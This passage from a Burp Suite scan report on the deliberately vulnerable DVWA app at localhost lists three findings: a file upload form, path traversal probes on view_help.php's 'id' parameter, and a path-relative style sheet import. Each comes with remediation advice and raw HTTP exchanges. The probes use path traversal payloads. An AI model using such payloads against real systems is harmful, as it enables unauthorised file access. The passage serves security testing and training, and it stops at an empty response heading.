&nbsp;<a class="PREVNEXT" href="#28.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/upload/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The page contains a form which is used to submit a user-supplied file to the following URL:<ul><li>http://localhost:7878/dvwa/vulnerabilities/upload/</li></ul>Note that Burp has not identified any specific security vulnerabilities with this functionality, and you should manually review it to determine whether any problems exist.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>File upload functionality is commonly associated with a number of vulnerabilities, including:</p>
<ul>
<li>File path traversal</li><li>Persistent cross-site scripting</li><li>Placing of other client-executable code into the domain</li><li>Transmission of viruses and other malware</li><li>Denial of service</li></ul>
<p>You should review file upload functionality to understand its purpose, and establish whether uploaded content is ever returned to other application users, either through their normal usage of the application or by being fed a specific link by an attacker.</p>
<p>Some factors to consider when evaluating the security impact of this functionality include:</p>
<ul>
<li>Whether uploaded content can subsequently be downloaded via a URL within the application.</li><li>What Content-type and Content-disposition headers the application returns when the file's content is downloaded.</li><li>Whether it is possible to place executable HTML/JavaScript into the file, which executes when the file's contents are viewed.</li><li>Whether the application performs any filtering on the file extension or MIME type of the uploaded file.</li><li>Whether it is possible to construct a hybrid file containing both executable and non-executable content, to bypass any content filters - for example, a file containing both a GIF image and a Java archive (known as a GIFAR file).</li><li>What location is used to store uploaded content, and whether it is possible to supply a crafted filename to escape from this location.</li><li>Whether archive formats such as ZIP are unpacked by the application.</li><li>How the application handles attempts to upload very large files, or decompression bomb files.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>File upload functionality is not straightforward to implement securely. Some recommendations to consider in the design of this functionality include:</p>
<ul>
<li>Use a server-generated filename if storing uploaded files on disk.</li><li>Inspect the content of uploaded files, and enforce a whitelist of accepted, non-executable content types. Additionally, enforce a blacklist of common executable formats, to hinder hybrid file attacks.</li><li>Enforce a whitelist of accepted, non-executable file extensions.</li>
<li>If uploaded files are downloaded by users, supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment.</li>
<li>Enforce a size limit on uploaded files (for defense-in-depth, this can be implemented both within application code and in the web server's configuration).</li><li>Reject attempts to upload archive formats such as ZIP.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://github.com/cure53/H5SC/tree/master/attachments">Various proof-of-concept files</a></li>
<li><a href="http://labs.detectify.com/post/120088174539/building-an-xss-polyglot-through-swf-and-csp">An XSS polyglot attack</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/434.html">CWE-434: Unrestricted Upload of File with Dangerous Type</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/17.html">CAPEC-17: Using Malicious Files</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/upload/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=4ghccptncgdo7jma267ubdr2qt<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:54 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4007<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br>&lt;br /&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;input name="uploaded" type="file" /&gt;</span>&lt;br /&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="28">28.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_help.php</span>
<br><a class="PREVNEXT" href="#27">Previous</a>
&nbsp;<a class="PREVNEXT" href="#29">Next</a>
<br>
<span class="BODH1" id="28.1">28.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00100b00_filepathmanipulation">File path manipulation</a></span>
<br><a class="PREVNEXT" href="#27.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#28.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/view_help.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The <b>id</b> parameter appears to be vulnerable to file path manipulation attacks. <br><br>The payload <b>./muo/../brute</b> was submitted in the id parameter. This returned the same content as the base request. The payload <b>.../brute</b> was then submitted, and this returned a different response. This indicates that the application may be vulnerable to file path manipulation.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>File path manipulation vulnerabilities arise when user-controllable data is placed into a file or URL path that is used on the server to access local resources, which may be within or outside the web root. If vulnerable, an attacker can modify the file path to access different resources, which may contain sensitive information. Even where an attack is constrained within the web root, it is often possible to retrieve items that are normally protected from direct access, such as application configuration files, the source code for server-executable scripts, or files with extensions that the web server is not configured to serve directly.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>Ideally, application functionality should be designed in such a way that user-controllable data does not need to be placed into file or URL paths in order to access local resources on the server. This can normally be achieved by referencing known files via an index number rather than their name.</p>
<p>If it is considered unavoidable to place user data into file or URL paths, the data should be strictly validated against a whitelist of accepted values. Note that when accessing resources within the web root, simply blocking input containing file path traversal sequences (such as dot-dot-slash) is not always sufficient to prevent retrieval of sensitive information, because some protected items may be accessible at the original path without using any traversal sequences. </p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/file-path-traversal">Web Security Academy: Directory traversal</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/23.html">CWE-23: Relative Path Traversal</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/35.html">CWE-35: Path Traversal: '.../...//'</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/36.html">CWE-36: Absolute Path Traversal</a></li>
	<li><a href="https://capec.mitre.org/data/definitions/126.html">CAPEC-126: Path Traversal</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_help.php?id=<span class="HIGHLIGHT">.%2fmuo%2f..%2fbrute</span>&amp;security=low&amp;locale=en HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=62bnl6i7oso4neelguqvb361e0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:13 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: <span class="HIGHLIGHT">4255</span><br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Help :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/tit<br><b>...[SNIP]...</b><br>&lt;div class="body_padded"&gt;<br> &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;div class="body_padded"&gt;<br> &nbsp;&nbsp;&nbsp;&lt;h1&gt;Help - Brute Force (Login)&lt;/h1&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;div id="code"&gt;<br> &nbsp;&nbsp;&nbsp;&lt;table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid"&gt;<br> &nbsp;&nbsp;&nbsp;&lt;tr&gt;<br> &nbsp;&nbsp;&nbsp;&lt;td&gt;&lt;div id="code"&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;h3&gt;About&lt;/h3&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;p&gt;Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;A common approach is to repeatedly try guesses for the password.&lt;/p&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;p&gt;Users often choose weak passwords. Examples of insecure choices include single words found in dictionaries, family names, any too short password<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;(usually thought to be less than 6 or 7 characters), or predictable patterns<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;(e.g. alternating vowels and consonants, which is known as leetspeak, so "password" becomes "p@55w0rd").&lt;/p&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;p&gt;Creating a targeted wordlists, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;based on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;p&gt;A last resort is to try every possible password, known as a brute force attack. In theory, if there is no limit to the number of attempts, a brute force attack will always<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;be successful since the rules for acceptable passwords must be publicly known; but as the length of the password increases, so does the number of possible passwords<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;making the attack time longer.&lt;/p&gt;</span><span class="HIGHLIGHT"><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;</span>&lt;br /&gt;<span class="HIGHLIGHT">&lt;hr /&gt;</span>&lt;br /&gt;<span class="HIGHLIGHT"><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;</span><span class="HIGHLIGHT">&lt;h3&gt;Objective&lt;/h3&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;p&gt;Your goal is to get the administrator...s password by brute forcing. Bonus points for getting the other four user passwords!&lt;/p&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;h3&gt;Low Level&lt;/h3&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;p&gt;The developer has completely missed out &lt;u&gt;any protections methods&lt;/u&gt;, allowing for anyone to try as many times as they wish, to login to any user without any repercussions.&lt;/p&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;br /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;h3&gt;Medium Level&lt;/h3&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;p&gt;This stage adds a sleep on the failed login screen. This mean when you login incorrectly, there will be an extra two second wait before the page is visible.&lt;/p&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;p&gt;This will only slow down the amount of requests which can be processed a minute, making it longer to brute force.&lt;/p&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;br /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;h3&gt;High Level&lt;/h3&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;p&gt;There has been an "anti Cross-Site Request Forgery (CSRF) token" used. There is a old myth that this protection will stop brute force attacks. This is not the case.<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;This level also extends on the medium level, by waiting when there is a failed login but this time it is a random amount of time between two and four seconds.<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;The idea of this is to try and confuse any timing predictions.&lt;/p&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;p&gt;Using a &lt;a href="https://en.wikipedia.org/wiki/CAPTCHA" target="_blank"&gt;CAPTCHA&lt;/a&gt; form could have a similar effect as a CSRF token.&lt;/p&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;br /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;h3&gt;Impossible Level&lt;/h3&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;p&gt;Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a "lock out" feature, where if there are five bad logins within<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;the last 15 minutes, the locked out user cannot log in.&lt;/p&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;p&gt;If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if there is a valid account on the system, with that password, and if the account is locked.&lt;/p&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;p&gt;This can cause a "Denial of Service" (DoS), by having someone continually trying to login to someone's account.<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;This level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).&lt;/p&gt;<br> &nbsp;&nbsp;&nbsp;&lt;/div&gt;&lt;/td&gt;<br> &nbsp;&nbsp;&nbsp;&lt;/tr&gt;<br> &nbsp;&nbsp;&nbsp;&lt;/table&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;/div&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;br /&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;p&gt;Reference: &lt;a href="https://en.wikipedia.org/wiki/Password_cracking" target="_blank"&gt;https://en.wikipedia.org/wiki/Password_cracking&lt;/a&gt;&lt;/p&gt;<br>&lt;/div&gt;</span><span class="HIGHLIGHT"><br><br></span>&lt;/div&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_help.php?id=<span class="HIGHLIGHT">...%2fbrute</span>&amp;security=low&amp;locale=en HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=62bnl6i7oso4neelguqvb361e0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:13 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: <span class="HIGHLIGHT">675</span><br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Help :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/tit<br><b>...[SNIP]...</b><br>&lt;br /&gt;<span class="HIGHLIGHT"><br></span><span class="HIGHLIGHT">&lt;b&gt;Warning&lt;/b&gt;:  file_get_contents(../vulnerabilities/.../brute/help/help.php): Failed to open stream: No such file or directory in &lt;b&gt;C:\xampp\htdocs\DVWA\vulnerabilities\view_help.php&lt;/b&gt; on line &lt;b&gt;20&lt;/b&gt;</span>&lt;br /&gt;<span class="HIGHLIGHT"><br><br></span>&lt;/div&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="28.2">28.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#28.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#28.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/view_help.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_help.php?id=brute&amp;security=low&amp;locale=en HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=62bnl6i7oso4neelguqvb361e0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:31:27 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4255<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Help :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../dvwa/css/help.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_help.php<span class="HIGHLIGHT">/up3jz9/qg3xcj/</span>?id=brute&amp;security=low&amp;locale=en HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=62bnl6i7oso4neelguqvb361e0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:17 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4255<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Help :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../dvwa/css/help.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/view_help.php/up3jz9/dvwa/css/help.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=62bnl6i7oso4neelguqvb361e0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
